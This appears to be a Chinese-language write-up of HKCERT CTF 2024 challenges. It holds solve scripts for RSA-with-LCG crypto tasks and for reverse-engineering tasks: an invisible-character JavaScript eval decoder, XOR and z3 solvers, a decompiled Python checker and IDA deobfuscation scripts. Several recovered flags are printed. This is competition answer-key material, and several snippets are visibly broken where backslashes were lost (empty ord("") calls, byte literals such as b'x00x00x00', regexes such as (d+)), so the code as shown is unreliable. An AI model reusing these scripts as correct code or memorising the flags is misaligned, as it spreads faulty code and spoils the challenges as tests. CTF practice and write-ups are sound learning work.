# 香港網安奪旗賽HKCERT CTF 2024 Write up（下）

> 原文: https://www.ctfiot.com/221684.html
> ID: 221684

Crypto

RSA LCG (0)

RSA LCG (1)

Reverse

虛空

再一個破解挑戰

嬰兒梳打餅

Cyp.ress

旗幟檢查機

ISA 101

炒埋一碟

bashed!

Pwn

旗幟雜湊

ChatGGT (1)

 Crypto 

RSA LCG (0)

多執行緒爆破：

#from rich.progress import track
from Crypto.Util.number import isPrime as is_prime
from Crypto.Util.number import long_to_bytes
from tqdm import tqdm
import multiprocessing

class LCG:
    def __init__(self, bits, a=None, c=None, seed=None):
        self.seed = seed
        if self.seed is None: self.seed = secrets.randbits(bits) | 1
        self.a = a
        if self.a is None: self.a = secrets.randbits(bits) | 1
        self.c = c
        if self.c is None: self.c = secrets.randbits(bits)
        self.bits = bits
        self.m = 2**bits

    def next(self):
        self.seed = (self.seed * self.a + self.c) % self.m
        return self.seed

    def __repr__(self):
        return f'LCG(bits={self.bits}, a={self.a}, c={self.c})'

def get_prime(lcg, bits):
    while True:
        p = 0
        for i in range(bits//lcg.bits):
            p <<= lcg.bits
            p |= lcg.next()
        
        if p.bit_length() != bits: continue
        if not is_prime(p): continue

        return p

n = 481114791694785858695050549695538734046971417176843978882044871919616727765643820034066591387776993303130591599679964348353329376559922076715381691496791199317834852972956556186543750873476577029492255903246050392214315442941266567737558736141253495436298490003513325026207840446389886295321748490024615821174562383476857761918630446488869812894422048853097952363719756297344014883459670109643440173428469002028435568608888993928248402297380061528970024946401518041243564217741744613525402813984605478699738311132717493610790718032712239270654974446116711995328572373804563487208899590643981315012517538379075118546604524143430683964513429268368997878214614073305169449253802788601323508855536854500946367628892634824935231007194546528797696281628426050519984306590514055620223093615738335974270220301535497863462980632453977776013292134758089648072661829571370276168813518517058289217357255320627263734650032320305279867840420886394855960116879598125383109784504746667833173574005936871719063288584361794901458463052848937392072728849939635133710409996428462876274835371522565826839423046726308001047859782566419852401917763502007196004524754115471117969452116174478677547559057917128250716516531170082878464757039874318490906158689
e = 65537
c = 345977789156696385683581168846000378215844867611205467179181525756923773343997491856273352579925123046597359189866939437231366570263052567113535467666353517443555775669947203980735918360811410985879753948221470545729133552842244535778330182549296248222039054438197983267418429814674564210947108838042963108251861548375535326969960093796185009763176002544709169063466256285182205803310470811843866647483609768051301160908646352263376778439044867189801653416628219979460525679135210530110143121851284249580066642389243748128010268277263972367956550837364650977683324140767090284085773301486622501777068017859676285398384937589784505599555747372780238872296757407155242584567297352399943303106161556729208284654934208601533197169169514879515899747537955886064112109885660797961038075757520138954391314283382301755474526387505278386817416193439304304484679228240909612236945218009947246430065957288065358434877715856330476675541582153869420244176864467086961698529560004535449279996657026744930241841052475481816491735959706500890907139027990119800255632071177694111432383236909734940374926954075681464953536382583119130818187839809617068848876572944726598351264384270260481762978383770917542259594389267566490962365207501538561114532291

def func(srange):
    lcg = LCG(bits=128, a=181525535962623036141846439269075744717, c=115518761677956575882056543847720910703, seed=1)
    for seed in range(srange[0], srange[1]):
        if seed % 2 == 0:
            continue
        lcg.seed = seed
        p0 = get_prime(lcg, bits=1024)
        if n % p0 == 0: 
            print(seed)
            return seed
    return None

T = 16
N = 2**16
pool = multiprocessing.Pool()
pars = []
for i in range(T):
    pars += [(N//T * i, N//T * (i+1))]
print(pars)
#results = pool.map(func, pars)

seed = 58727
lcg = LCG(bits=128, a=181525535962623036141846439269075744717, c=115518761677956575882056543847720910703, seed=1)
lcg.seed = seed
ps = [get_prime(lcg, bits=1024) for _ in range(4)]

# 2. Computes the private key, d, of the multiprime RSA
n = ps[0] * ps[1] * ps[2] * ps[3]
phi = (ps[0]-1) * (ps[1]-1) * (ps[2]-1) * (ps[3]-1)
e = 0x10001
d = pow(e, -1, phi)

# 3. Decrypts the ciphertext
m = pow(c, d, n)

# 4. Converts the ciphertext to a bytearray, and prints it
flag = long_to_bytes(m)
print(f'{flag = }')

from tqdm import tqdm
import itertools

a = 102197201962123846389438942955101245465045811321520032783251514372432272871077
n = 712650313276602240132329097304430048400352751513310575526412992129597422070848111072491134888258819603174150809317988369755331029009864211216547294646211646094933573124257136163629116984386416188859789467395164897001085191528084740453428500956450177548977865861466055171717564208692444769495508512419622780024874941844495178742341131675818700155796280310646897103229083027529919187454771613414875490462993045875936234591157744167214046734190302287427367403568860249349359776931200150301621481939428066984857258770478004853926288162003818241246878159630318266155498887714140614580751646422502723648142074111613225912644502226694307736726087673647398291980857229829977354067820423709011783907277562489549103977052076140881547728240425069463175586173317054911517453708001448687312406872942899280723472709421452062317503252258181984837591194705354256671714708896675155493168030996749797654707148117051477506855802867089687545890519363621855230477269747205380531049996041867129632051572747028441506474146062043427303954298727328531350438208765938027973006421501568307421856483699068172998763428694958905673708416275143602068221058898394079378423785058886143156065469790907727616640696078658243794470631540358286862899496224884600294835441
e = 65537
c = 445308155915029567991204642441037106636274278969323594266962964897048528466773947276913391974222302661172087064465526779062356615268434642959161607080766074334140739062421641878296527210809334178619685030176261525389226557543594953035919061416292966585184462770190073132725325830890587610808224156896611989260754435566640011008330800266408350415234832430226789140062590779004940578475055195767146347394381212157930691103929079825296986828415158506003438261121628407171546274414046568037336522095223978532053246031668840069046046390952201058199981492454288495640857942797704964843287034359460079316661425483842570190113998195387780579545809621808801626313837113473885818945052873823360056317079785841069224993435527933283918571286444280017102781865312454024328849395335083566145607543834607504822081522250923714391873652357185101163374950977150829214936039230387625706376713934778873385375582488086205462961139042991664546797362021066081938999660281537596860879414252495949608351649066648594254272314188241185715920283526637402373027396529855631498571685297193020517033784357794223831020791070397249992230576960345185544552280142788704673413055403847038488791910041421887897364099871208624646292906015164161354890370666964030412257423
bits = 256

class LCG:
    def __init__(self, bits, a=None, c=None, seed=None):
        self.seed = seed
        if self.seed is None: self.seed = secrets.randbits(bits) | 1
        self.a = a
        if self.a is None: self.a = secrets.randbits(bits) | 1
        self.c = c
        if self.c is None: self.c = secrets.randbits(bits)
        self.bits = bits
        self.m = 2^bits

    def next(self):
        self.seed = (self.seed * self.a + self.c) % self.m
        return self.seed

    def __repr__(self):
        return f'LCG(bits={self.bits}, a={self.a}, c={self.c})'

def get_prime(lcg, bits):
    while True:
        p = 0
        for i in range(bits//lcg.bits):
            p <<= lcg.bits
            p |= lcg.next()

        if p.bit_length() != bits: continue
        if not is_prime(p): continue

        return p

'''
# S0 have multiple solutions
assert 4 == 1024 // 256
N1 = 1 + 2 + 3 + 4
N2 = 100
for i in tqdm(range(N1, N2)):
  k = 4 * i
  S4 = n * Integer(a^k).inverse_mod(2^bits) % 2^bits
  S0s = Zmod(2^bits)(S4).nth_root(4, all=True)
  for S0 in S0s:
    lcg = LCG(bits=256, a=int(a), c=int(0), seed=int(S0))
    p0 = get_prime(lcg, 1024)
    if n % p0 == 0:
      print(S0, p0)
      print('------')
      lcg = LCG(bits=256, a=int(a), c=int(0), seed=int(S0))
      ps = [get_prime(lcg, 1024) for _ in range(4)]
      if product(ps) == n:
        print(S0)
        print(ps)
        break
  else:
    continue
  break
'''

p0 = 135903866800838949847562793088150486310158003742367999201618612092808911647629708846623473742286499456077676701909288795481951908691947873229391322992966930031165730815188915669519843444105532123363400169889835634559515424007665328845639044964239115444381314299097514938630949544528906240701881863266616834913
e = 0x10001
d = e.inverse_mod(p0-1)
m = Integer(pow(c, d, p0))
flag = bytes.fromhex(m.hex())
print(flag)

# b'hkcert24{c0mpu71n9_subs3qu3nc3s_0f_g30m3tr1c_s3qu3nc3s_1s_fun}'

with (ㅤ`` ) {
// 一片空白？
}
function u3164(){return f="",p=[]  
,new Proxy({},{has:(t,n)=>(p.push(
n.length-1),2==p.length&&(p[0]||p[
1]||eval(f),f+=String.fromCharCode
(p[0]<<4|p[1]),p=[]),!0)})}//aem1k

array = [9, 10, 11, 12, 13, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126]
array2 = [58, 38, 66, 88, 78, 39, 80, 125, 64, 106, 48, 49, 98, 32, 42, 59, 126, 93, 33, 56, 112, 120, 60, 117, 111, 45, 87, 35, 10, 68, 61, 77, 11, 55, 121, 74, 107, 104, 65, 63, 46, 110, 34, 41, 102, 97, 81, 12, 47, 51, 103, 89, 115, 75, 54, 92, 90, 76, 113, 122, 114, 52, 72, 70, 50, 94, 91, 73, 84, 95, 36, 82, 124, 53, 108, 101, 9, 13, 44, 96, 67, 85, 116, 123, 100, 37, 43, 119, 71, 105, 118, 69, 99, 79, 86, 109, 62, 83, 40, 57]
array3 = [16684662107559623091, 13659980421084405632, 11938144112493055466, 17764897102866017993, 11375978084890832581, 14699674141193569951]
num = 14627333968358193854
num2 = 8

for i in range(len(array3)):
    array3[i] ^= num

l = b''
for x in array3:
    l += x.to_bytes(num2, 'little')
l = l.replace(b'x01', b'')
l = list(l)

d = dict(zip(array2, array))
l = [d[x] for x in l]
print(l)
print(bytes(l))

from z3 import *

flag = b'hkcert24{'

# xor
off = [0xCE, 0x21, 0xDB, 0x64, 0xD1, 0x50, 0xE0, 0x1B, 0x0D, 0x3E, 0xFB, 0x0A, 0x52, 0x2F, 0x94, 0x9D, 0xAF, 0xB1, 0x58, 0x6B, 0x8A, 0xEE, 0xC1, 0xF0, 0xFC, 0x19, 0x0A, 0xE3, 0xE9, 0x1E, 0xD0, 0x4A, 0x62, 0xF2, 0x47, 0xA8, 0x20, 0x0B, 0xD3, 0x6C, 0x1C, 0x1C, 0x56, 0x5B, 0x9B, 0xB3, 0x4D, 0x3D, 0xCE, 0x83, 0x80, 0xC0, 0xE6, 0x7E, 0xE8, 0x09, 0xBD, 0x14, 0xC4, 0x47, 0xA1, 0xF6, 0x2F, 0xD1, 0x31, 0x5C, 0x1E, 0x10, 0xD1, 0x2A, 0xE0, 0x53, 0x45, 0xFE, 0x85, 0x58, 0xA6, 0xAD, 0x03, 0xCC, 0x10, 0x4B, 0xD3, 0x94, 0xFE, 0x62, 0x85, 0x4E, 0x4A, 0x27, 0x35, 0xE2, 0x94, 0x0F, 0x49, 0x91, 0x86, 0xD7, 0x80, 0x35, 0x4C, 0x67, 0xC3, 0xAA, 0x3C, 0x67, 0xE8, 0x3F, 0xE4, 0x67, 0x23, 0xDE, 0x8E, 0x2D, 0x46, 0x25, 0x36, 0xE1, 0xF3, 0x90, 0x7D, 0x0F, 0xB9, 0x14, 0x8C, 0xE7, 0xB6, 0xA6, 0x1A, 0x90, 0x80, 0x79, 0x85, 0x35, 0xFD, 0x51, 0x8C, 0x10, 0xE9, 0x3F, 0x32, 0xCC, 0x4B, 0xB5, 0x42, 0xDE, 0xF5, 0x57, 0x13, 0xC8, 0x09, 0x9B, 0x4D, 0x19, 0x84, 0x91, 0x5F, 0x9D, 0x77, 0x30, 0x31, 0xC7, 0x28, 0x8D, 0x1D, 0xF4, 0x71, 0xE4, 0xD1, 0xA3, 0x0C, 0x07, 0x59, 0xAA, 0x0D, 0xAD, 0x16, 0x35, 0x40, 0xB9, 0x28, 0x6A, 0xB5, 0x4C, 0x24, 0x5A, 0x8D, 0xA6, 0xA6, 0xC4, 0x56, 0xDD, 0xC0, 0x9B, 0xBF, 0xCC, 0xDE, 0x0C, 0x5B, 0xC1, 0x75, 0xDD, 0x77, 0xBB, 0xF6, 0x2B, 0x43, 0x1D, 0x13, 0x03, 0xAD, 0x73, 0xA3, 0xAC, 0x4D, 0xEA, 0xA5, 0x2F, 0xC2, 0x3E, 0x4A, 0x1A, 0xF5, 0x65, 0x72, 0xE5, 0x4A, 0x10, 0x10, 0x8C, 0xFB, 0x10, 0x0A, 0x4D, 0x79, 0x71, 0xF6, 0xC7, 0x80, 0x54, 0x64, 0xB0, 0x02, 0xAA, 0xD8, 0x7C, 0x39, 0x53, 0xEC, 0xAD, 0xB4, 0x4E, 0x2F, 0xEB, 0xE0, 0x47, 0x00]
dst = [0xBD, 0x10, 0xB6, 0x50, 0xBD, 0x35, 0xBF, 0x78, 0x7F, 0x0A, 0x98, 0x61, 0x1F, 0x1C, 0xCB, 0xA9, 0xF0, 0xD9, 0x6C, 0x05, 0xEE, 0xAC, 0xB8, 0x98, 0x9D, 0x77, 0x3C, 0xBC, 0x81, 0x2E, 0xA0, 0x79, 0x3D, 0x8B, 0x77, 0xDD, 0x7F, 0x6F, 0xE3, 0x02, 0x2B, 0x43, 0x38, 0x68, 0xA8, 0xD7, 0x12, 0x0A, 0xA1, 0xDC, 0xF5, 0xF3, 0x83, 0x21, 0xDC, 0x67, 0xDA, 0x66, 0x9B, 0x77, 0xD3, 0xA9, 0x55, 0xE2, 0x6E, 0x3A, 0x2E, 0x62, 0x8E, 0x5E, 0x88, 0x62, 0x36, 0xA1, 0xE7, 0x2D, 0x91, 0xF2, 0x32, 0x93, 0x67, 0x7B, 0xBD, 0xF0, 0xCD, 0x10, 0xDA, 0x7F, 0x2C, 0x78, 0x56, 0x8A, 0xA0, 0x38, 0x2E, 0xE1, 0xB1, 0x88, 0xB0, 0x47, 0x13, 0x04, 0xF7, 0xC4, 0x63, 0x14, 0xDB, 0x0C, 0xBB, 0x13, 0x4B, 0xEF, 0xBB, 0x72, 0x24, 0x14, 0x59, 0x83, 0x90, 0xA4, 0x09, 0x69, 0xCC, 0x7A, 0xE2, 0x9E, 0x8C, 0x8F, 0x69, 0xA1, 0xED, 0x4D, 0xE9, 0x50, 0xA2, 0x32, 0xFE, 0x24, 0x8A, 0x54, 0x7F, 0xFF, 0x14, 0x81, 0x1D, 0xB6, 0xC1, 0x39, 0x77, 0x8A, 0x70, 0xF3, 0x2C, 0x77, 0xB2, 0xCE, 0x37, 0xAD, 0x07, 0x03, 0x6E, 0xBE, 0x18, 0xF8, 0x42, 0x90, 0x41, 0x8A, 0xE6, 0xFC, 0x62, 0x34, 0x6A, 0xCE, 0x52, 0x9A, 0x79, 0x6A, 0x35, 0x8A, 0x4D, 0x35, 0x81, 0x22, 0x43, 0x28, 0xD2, 0x96, 0xD4, 0x9B, 0x2C, 0xEE, 0x9F, 0xFD, 0x8F, 0xBE, 0x81, 0x78, 0x33, 0xF0, 0x06, 0x82, 0x15, 0xCE, 0xC1, 0x74, 0x72, 0x42, 0x64, 0x33, 0xC3, 0x17, 0x90, 0xDE, 0x12, 0xDB, 0xC3, 0x70, 0xA1, 0x56, 0x7E, 0x2D, 0x92, 0x15, 0x45, 0xBA, 0x7A, 0x62, 0x4F, 0xEF, 0xCF, 0x7E, 0x55, 0x3E, 0x4A, 0x42, 0xA9, 0xB3, 0xE8, 0x65, 0x51, 0xEF, 0x60, 0x9B, 0xB7, 0x1E, 0x5A, 0x67, 0x98, 0xCB, 0xC1, 0x20, 0x41, 0x92, 0xDA, 0x6E, 0x00]
l = []
for i in range(28):
    l.append(off[i] ^ dst[i])
flag += bytes(l)
print(flag) # 打出來睇睇

got = []
while True:
    s = [Int(f"s{i}") for i in range(3)]
    solver = Solver()
    for i in range(3):
        solver.add(s[i] < 127)
        solver.add(s[i] >= 32)
        solver.add(s[i] != ord("~"))
        solver.add(s[i] != ord("}"))
        solver.add(s[i] != ord("|"))
        solver.add(s[i] != ord("{"))
        solver.add(s[i] != ord("\"))
        solver.add(s[i] != ord("]"))
        solver.add(s[i] != ord("["))
        solver.add(s[i] != ord("`"))
        solver.add(s[i] != ord("_"))
        solver.add(s[i] != ord("^"))
        for x in got:
            solver.add(s[0] != x)
    solver.add(s[0] + s[1] + s[2] == 300)
    solver.add(s[0]*2 + s[1] + s[2]*2 == 496)
    solver.add(s[0] + s[1]*3 + s[2] == 508)
    if solver.check() == sat:
        m = solver.model()
        l = []
        for i in range(3):
            l.append(m[s[i]].as_long())
        got.append(l[0])
        print(bytes(l)+b'1}')
    else:
        break 

# flag += b'1}'
# print(flag)

sser.cpython-312.pyc (Python 3.12)
[Code]
    File Name: sser.py
    Object Name: <module>
    Qualified Name: <module>
    Arg Count: 0
    Pos Only Arg Count: 0
    KW Only Arg Count: 0
    Stack Size: 6
    Flags: 0x00000000
    [Names]
        'os'
        'requests'
        'Crypto.Cipher'
        'AES'
        'hashlib'
        'get_nonce'
        'input'
        'encode'
        'flag'
        'nonce'
        'post'
        'hex'
        'r'
        'bytes'
        'fromhex'
        'text'
        'c0'
        'sha256'
        'digest'
        'key'
        'iv'
        'new'
        'MODE_CFB'
        'cipher'
        'encrypt'
        'c1'
        'print'
    [Locals+Names]
    [Constants]
        0
        None
        (
            'AES'
        )
        [Code]
            File Name: sser.py
            Object Name: get_nonce
            Qualified Name: get_nonce
            Arg Count: 0
            Pos Only Arg Count: 0
            KW Only Arg Count: 0
            Stack Size: 4
            Flags: 0x00000003 (CO_OPTIMIZED | CO_NEWLOCALS)
            [Names]
                'os'
                'urandom'
                'hashlib'
                'sha256'
                'digest'
            [Locals+Names]
                'nonce'
            [Constants]
                None
                16
                b'pow/'
                3
                b'x00x00x00'
            [Disassembly]
                0       RESUME                          0
                2       NOP                             
                4       LOAD_GLOBAL                     1: NULL + os
                14      LOAD_ATTR                       2: urandom
                34      LOAD_CONST                      1: 16
                36      CALL                            1
                44      STORE_FAST                      0: nonce
                46      LOAD_GLOBAL                     5: NULL + hashlib
                56      LOAD_ATTR                       6: sha256
                76      LOAD_CONST                      2: b'pow/'
                78      LOAD_FAST                       0: nonce
                80      BINARY_OP                       0 (+)
                84      CALL                            1
                92      LOAD_ATTR                       9: digest
                112     CALL                            0
                120     LOAD_CONST                      0: None
                122     LOAD_CONST                      3: 3
                124     BINARY_SLICE                    
                126     LOAD_CONST                      4: b'x00x00x00'
                128     COMPARE_OP                      40 (==)
                132     POP_JUMP_IF_FALSE               2 (to 138)
                134     LOAD_FAST                       0: nonce
                136     RETURN_VALUE                    
                138     JUMP_BACKWARD                   68 (to 4)
        'What is the flag?> '
        'https://c12-cypress.hkcert24.pwnable.hk/'
        'nonce'
        (
            'json'
        )
        b'key/'
        16
        b'iv/'
        '🙆🙅'
    [Disassembly]
        0       RESUME                          0
        2       LOAD_CONST                      0: 0
        4       LOAD_CONST                      1: None
        6       IMPORT_NAME                     0: os
        8       STORE_NAME                      0: os
        10      LOAD_CONST                      0: 0
        12      LOAD_CONST                      1: None
        14      IMPORT_NAME                     1: requests
        16      STORE_NAME                      1: requests
        18      LOAD_CONST                      0: 0
        20      LOAD_CONST                      2: ('AES',)
        22      IMPORT_NAME                     2: Crypto.Cipher
        24      IMPORT_FROM                     3: AES
        26      STORE_NAME                      3: AES
        28      POP_TOP                         
        30      LOAD_CONST                      0: 0
        32      LOAD_CONST                      1: None
        34      IMPORT_NAME                     4: hashlib
        36      STORE_NAME                      4: hashlib
        38      LOAD_CONST                      4: 'What is the flag?> '
        40      CALL_INTRINSIC_1                1 (INTRINSIC_PRINT)
        42      POP_TOP                         
        44      LOAD_CONST                      3: <CODE> get_nonce
        46      MAKE_FUNCTION                   0
        48      STORE_NAME                      5: get_nonce
        50      PUSH_NULL                       
        52      LOAD_NAME                       6: input
        54      BUILD_STRING                    0
        56      CALL                            1
        64      LOAD_ATTR                       15: encode
        84      CALL                            0
        92      STORE_NAME                      8: flag
        94      PUSH_NULL                       
        96      LOAD_NAME                       5: get_nonce
        98      CALL                            0
        106     STORE_NAME                      9: nonce
        108     PUSH_NULL                       
        110     LOAD_NAME                       1: requests
        112     LOAD_ATTR                       20: post
        132     LOAD_CONST                      5: 'https://c12-cypress.hkcert24.pwnable.hk/'
        134     LOAD_CONST                      6: 'nonce'
        136     LOAD_NAME                       9: nonce
        138     LOAD_ATTR                       23: hex
        158     CALL                            0
        166     BUILD_MAP                       1
        168     KW_NAMES                        7: ('json',)
        170     CALL                            2
        178     STORE_NAME                      12: r
        180     LOAD_NAME                       13: bytes
        182     LOAD_ATTR                       29: fromhex
        202     LOAD_NAME                       12: r
        204     LOAD_ATTR                       30: text
        224     CALL                            1
        232     STORE_NAME                      16: c0
        234     PUSH_NULL                       
        236     LOAD_NAME                       4: hashlib
        238     LOAD_ATTR                       34: sha256
        258     LOAD_CONST                      8: b'key/'
        260     LOAD_NAME                       9: nonce
        262     BINARY_OP                       0 (+)
        266     CALL                            1
        274     LOAD_ATTR                       37: digest
        294     CALL                            0
        302     LOAD_CONST                      1: None
        304     LOAD_CONST                      9: 16
        306     BINARY_SLICE                    
        308     STORE_NAME                      19: key
        310     PUSH_NULL                       
        312     LOAD_NAME                       4: hashlib
        314     LOAD_ATTR                       34: sha256
        334     LOAD_CONST                      10: b'iv/'
        336     LOAD_NAME                       9: nonce
        338     BINARY_OP                       0 (+)
        342     CALL                            1
        350     LOAD_ATTR                       37: digest
        370     CALL                            0
        378     LOAD_CONST                      1: None
        380     LOAD_CONST                      9: 16
        382     BINARY_SLICE                    
        384     STORE_NAME                      20: iv
        386     PUSH_NULL                       
        388     LOAD_NAME                       3: AES
        390     LOAD_ATTR                       42: new
        410     LOAD_NAME                       19: key
        412     LOAD_NAME                       3: AES
        414     LOAD_ATTR                       44: MODE_CFB
        434     LOAD_NAME                       20: iv
        436     CALL                            3
        444     STORE_NAME                      23: cipher
        446     LOAD_NAME                       23: cipher
        448     LOAD_ATTR                       49: encrypt
        468     LOAD_NAME                       8: flag
        470     CALL                            1
        478     STORE_NAME                      25: c1
        480     PUSH_NULL                       
        482     LOAD_NAME                       26: print
        484     LOAD_CONST                      11: '🙆🙅'
        486     LOAD_NAME                       16: c0
        488     LOAD_NAME                       25: c1
        490     COMPARE_OP                      55 (!=)
        494     BINARY_SUBSCR                   
        498     CALL                            1
        506     POP_TOP                         
        508     RETURN_CONST                    1: None

import os
import requests
from Crypto.Cipher import AES
import hashlib

print('What is the flag?> ')

def get_nonce():
    while True:
        nonce = os.urandom(16)
        if hashlib.sha256(b'pow/'+nonce).digest()[:3] == b'x00x00x00':
            return nonce

# flag = input().encode()
nonce = get_nonce()
r = requests.post('https://c12-cypress.hkcert24.pwnable.hk/', json={"nonce": nonce.hex()})
c0 = bytes.fromhex(r.text)
key = hashlib.sha256(b'key/'+nonce).digest()[:16]
iv = hashlib.sha256(b'iv/'+nonce).digest()[:16]
cipher = AES.new(key, AES.MODE_CFB, iv)
# c1 = cipher.encrypt(flag)
# assert c0 == c1
print(cipher.decrypt(c0))

from z3 import *

r = [0x0000000089E216C7, 0x000000008BBA1F53, 0x00000000EEDAC203, 0x00000000A3A18665, 0x0000000094ED1363, 0x00000000F962506F, 0x00000000D9CE8AAF, 0x00000000B1375EA5, 0x00000000B5F3A527, 0x00000000864090E5, 0x000000008B69129D, 0x00000000E93765CB, 0x00000000E69D6F8F, 0x00000000EF102543, 0x00000000BF72B95B, 0x00000000B92FC919, 0x00000000BB5F04B1, 0x00000000D6DB2593, 0x00000000AF09D917, 0x00000000E6CACC41, 0x00000000F6E60F6F, 0x00000000C11F4CB5, 0x00000000F7617AB7, 0x00000000FA6A6B91, 0x00000000B45D2387, 0x0000000083E969C3, 0x00000000B21505B3, 0x00000000C7455743, 0x00000000CBBB1795, 0x00000000C5B265AD, 0x00000000D65D3205, 0x00000000EF73C749, 0x00000000BD0DF89D, 0x00000000D13BD13D, 0x0000000091E98453, 0x0000000092BED8BF, 0x00000000F96B4745, 0x000000008B3639CF, 0x00000000E1CF7EC1, 0x00000000F79644BF, 0x00000000C0CC4405, 0x00000000C29357D5, 0x00000000DB8B19EF, 0x00000000B2432FCD, 0x00000000C01582B7, 0x00000000E03B43F3, 0x00000000805EDEA7, 0x00000000DDB2CB1D, 0x00000000BACBA2A1, 0x00000000E4F71B79, 0x00000000963367C3, 0x00000000BAC0308F, 0x00000000B371D959, 0x00000000CA966811, 0x00000000933E6A4F, 0x00000000854AEF83, 0x00000000B7BB6693, 0x00000000BF1CE60F, 0x00000000BB3F20F7, 0x00000000E04451E5, 0x0000000095BF97C9, 0x00000000D4349163, 0x000000008C8EF06D, 0x00000000EA039ADF]
dst = [0x0000000034455A43, 0x000000001490EB26, 0x0000000072151D59, 0x0000000039AD5153, 0x0000000049F794E0, 0x000000002CB40ABD, 0x0000000080BED156, 0x00000000855CC82F, 0x00000000900B909A, 0x000000006372D3FD, 0x00000000352D899E, 0x000000002981BCB2, 0x0000000027B68BFD, 0x0000000064A2DD3A, 0x000000003DB5729D, 0x00000000805016D6, 0x00000000097ACEE3, 0x0000000017C89862, 0x000000009F4002A9, 0x0000000009964C05, 0x00000000DB22B70C, 0x00000000BA1DB04A, 0x00000000C0066755, 0x000000000B3F68F9, 0x00000000899942F8, 0x000000000A10D428, 0x00000000235ACDE2, 0x000000000679D88D, 0x00000000017E5E57, 0x00000000AAB78154, 0x000000005F922062, 0x000000000A72B4FD, 0x000000005400B65A, 0x0000000078EAAFE5, 0x000000004369B177, 0x000000001990E4C3, 0x000000009E868CE2, 0x000000005CABAF14, 0x0000000045FD0454, 0x0000000083109EE8, 0x000000003519EADA, 0x000000007C83921C, 0x000000000983CBAB, 0x00000000600DB65C, 0x00000000429BCB65, 0x0000000084CAD5D1, 0x000000007B249EDA, 0x000000007E459C6C, 0x000000006FFCF791, 0x000000000E976EEA, 0x00000000403AB703, 0x000000007AAB7C66, 0x000000004884F5CF, 0x000000002E4B8974, 0x0000000062AD5F11, 0x00000000068A9898, 0x000000007F4D7EA2, 0x00000000B69EA296, 0x0000000023CDBCE5, 0x0000000095DAADEA, 0x0000000085FBE56A, 0x00000000AC34334E, 0x0000000026D11383, 0x00000000C1617F7E]
arg = [0x00000000EE0F9DF9, 0x00000000C4E73EAD, 0x00000000D09B50EF, 0x000000009F758E2B, 0x00000000C7D7DB0B, 0x000000009DBE2A69, 0x00000000E38A352B, 0x00000000CA1FFFFF, 0x00000000F125338F, 0x00000000F5FEE2FB, 0x00000000BB5851D7, 0x00000000999B4ABD, 0x00000000A1C55209, 0x00000000F4CA133B, 0x00000000E8E26FA5, 0x00000000C32DDA41, 0x00000000DD6982FB, 0x00000000FC5F4D91, 0x00000000A0037ABB, 0x00000000A113B9DD, 0x00000000C93308F3, 0x000000009448EA39, 0x00000000B2FF73AD, 0x0000000086C0A263, 0x000000008B0C8427, 0x00000000E1C1771D, 0x00000000CE477441, 0x00000000E86F3DF9, 0x00000000EC65E2BD, 0x00000000EB800149, 0x00000000A37F8B1D, 0x00000000C7639133, 0x00000000CB7AEBDD, 0x00000000C2ECCFED, 0x00000000FF163BD9, 0x00000000A0F15895, 0x000000009B820709, 0x00000000A53A1B2B, 0x000000009CFEFC51, 0x00000000A7F9918F, 0x00000000F1B7E995, 0x00000000B513ED9B, 0x0000000092828A23, 0x00000000FC465845, 0x00000000E52B24A1, 0x0000000094ED65D9, 0x0000000096A84EFB, 0x000000008C296C57, 0x000000009D0CF09F, 0x00000000C9C170E7, 0x00000000C52FD5A9, 0x00000000861D06BB, 0x00000000D0FA8A5F, 0x0000000086D5AE6F, 0x00000000D08A8701, 0x00000000E48A14C3, 0x00000000D2232EA7, 0x00000000FF56B213, 0x000000008DF01487, 0x0000000095D9DBE5, 0x00000000816279D1, 0x00000000DD630D35, 0x00000000EA162535, 0x000000009AE3B49B]
s = Solver()
flag_int = [Int(f"flag{i}") for i in range(32)]

for i in range(32):
    s.add(flag_int[i] >= 0)
    s.add(flag_int[i] <= 0xFFFFFFFF)
    s.add((flag_int[i]*arg[i*2]) % r[i*2] == dst[i*2])
    s.add((flag_int[i]*arg[i*2+1]) % r[i*2+1] == dst[i*2+1])

if s.check() == sat:
    m = s.model()
    l = [m[flag_int[i]].as_long() for i in range(len(flag_int))]
    # print(l)
else:
    print("unsat")

flag = b''
for x in l:
    flag += x.to_bytes(4, 'big')
print(flag)

for ea in CodeRefsTo(0x25B009, False): # address of decompress
    get = []
    while True:
        ea = prev_head(ea) # 搵參數
        if get_operand_type(ea, 0) == 1 and get_operand_type(ea, 1) != 1:
            if get_operand_value(ea, 0) in [0, 6, 2]:
                get.append(get_operand_value(ea, 1))
        if len(get) == 3:
            break
    addr, length, key = get
    for ea in range(addr, addr+length): # xor
        del_items(ea)
        b = get_wide_byte(ea)
        b ^= (key & 0xFF)
        patch_byte(ea, b)
    create_insn(addr)
    add_func(addr)

import re

data = []
for ea in CodeRefsTo(0x25B009, False):
    get = []
    while True:
        ea = prev_head(ea)
        if get_operand_type(ea, 0) == 1 and get_operand_type(ea, 1) != 1:
            if get_operand_value(ea, 0) in [0, 6, 2]:
                get.append(get_operand_value(ea, 1))
        if len(get) == 3:
            break
    addr, length, key = get
    assert length == 86
    s = idaapi.decompile(addr)
    l1 = re.findall(r'std::string::operator[](a1, (d+)LL)', str(s))
    l2 = re.findall(r'^', str(s))
    l3 = re.findall(r'== (d+)', str(s))
#    if not l3:
#        print(hex(addr))
    data.append((int(l1[0]), int(l1[1]), int(l3[0]))) # 索引0 索引1 目標值
print(data)

# dst從上面拿的
